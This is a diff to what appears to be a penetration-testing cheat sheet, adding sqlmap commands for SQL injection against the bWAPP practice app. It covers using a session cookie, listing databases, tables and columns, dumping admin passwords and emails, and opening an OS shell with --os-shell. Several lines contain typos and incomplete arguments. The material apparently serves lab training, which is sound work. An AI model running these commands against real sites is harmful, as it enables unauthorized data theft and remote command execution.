@@ -76,6 +76,30 @@ sqlmap -u 'http://vicitim.site/search.php?id=2' -p id --technique=U
 
 # Dump contents of a specific table in a database
 sqlamp -u 'http://victim.site/search.php?=1' -D <database name> -T <table name> --dump
+
+# sqlmap using cookie
+sqlmap -u "URL" --cookie="PHPSESSID;SECURIRTY_LEVEL" -p 
+
+Use the SQLMapto to get a list of databases present on the database server.
+sqlmap -u "url" --cookie "PHPSESSID=m42ba6etbktfktvjadijnsaqg4; security_level=0" -p title --dbs
+
+Use the SQLMap to get a list of tables for database bWAPP.
+sqlmap -u "url" --cookie "PHPSESSID=; security_level=0" -p title --dbs -D bWAPP --tables
+
+Use the SQLMap to get the list of columns in the users table of the bWAPP database
+sqlmap -u "url" --cookie "PHPSESSID=; security_level=0" -p title --dbs -D bWAPP --tables -T users --columns
+
+SQLMap to dump password and email for admin from the users table. Press 'n' twice when prompted.
+sqlmap -u "url" --cookie "PHPSESSID=; security_level=0" -p title --dbs -D bWAPP --tables -T users -C admin,password,email --dump
+
+SQL Injection (POST/Search)
+
+Run SQLMap with this saved file. Again take "title" as the test parameter
+sqlmap -r request -p title
+
+os shell using sqlmap --os-shell option.
+sqlmap -r request -p title --os-shell
+```
 ```
 
 
